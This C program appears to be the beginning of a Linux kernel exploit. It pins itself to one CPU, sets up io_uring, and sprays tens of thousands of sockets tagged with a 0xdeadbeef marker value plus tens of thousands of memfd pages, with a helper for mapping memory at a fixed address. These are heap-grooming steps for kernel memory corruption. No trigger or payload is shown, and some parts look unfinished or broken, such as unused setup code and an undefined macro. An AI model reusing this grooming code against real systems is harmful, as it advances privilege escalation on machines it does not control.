#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sched.h>
#include <liburing.h>
#include <arpa/inet.h>
#include <sys/mman.h>

#define L1_CACHE_SHIFT 6
#define sk_buff_size 224

#define SOCK_MIN_SNDBUF 2 * (2048 + ALIGN(sk_buff_size, 1 << L1_CACHE_SHIFT))

void *allocate_shallow_pages(int nr_page, int memfd){
    uint64_t base = 0x133700000000;
    for (size_t i = 0; i < nr_page; i++)
    {
        if(mmap((void *)(base + i * 0x1000), 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, memfd, 0) == MAP_FAILED){
            perror("mmap");
            exit(1);
        }
    }
    return (void *)base;
}

int setup_memfd(char *name, int page_no){
    int memfd = memfd_create(name, MFD_CLOEXEC);
    if(memfd == -1){
        perror("memfd_create");
        exit(1);
    }
    fallocate(memfd, 0, 0, 0x1000 * page_no);
    return memfd;
}

int main()
{
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(0, &cpu);
    if(sched_setaffinity(0, sizeof(cpu), &cpu)){
        perror("sched_setaffinity");
        exit(1);
    }

    struct io_uring ring;
    if(io_uring_queue_init(4, &ring, 0)){
        perror("io_uring_queue_init");
        exit(1);
    }

    int limit = 46000 - 100;
    int nr_memfds = limit/2;
    int nr_socketfds = limit-limit/2;
    int *memfds = calloc(nr_memfds , sizeof(*memfds));
    int *sockets = calloc(nr_socketfds , sizeof(*sockets));

    uint64_t egg = 0xdeadbeefdeadbeef;

    for(int i=0; i<nr_socketfds; i++){
        sockets[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sockets[i] == -1){
            perror("socket");
            exit(1);
        }
        if(setsockopt(sockets[i], SOL_SOCKET, SO_MAX_PACING_RATE, &egg, sizeof(egg))){
            perror("setsockopt");
            exit(1);
        }
        int j = sockets[i] + SOCK_MIN_SNDBUF;
		if (setsockopt(sockets[i], SOL_SOCKET, SO_SNDBUF, &j, sizeof(int)) < 0)
			perror("failed to set SO_SNDBUF");
    }

    for(int i=0; i<nr_memfds; i++){
        char name[20];
        sprintf(name, "memfd-%d", i);
        memfds[i] = setup_memfd(name, 1);
    }

    

    return 0;
}
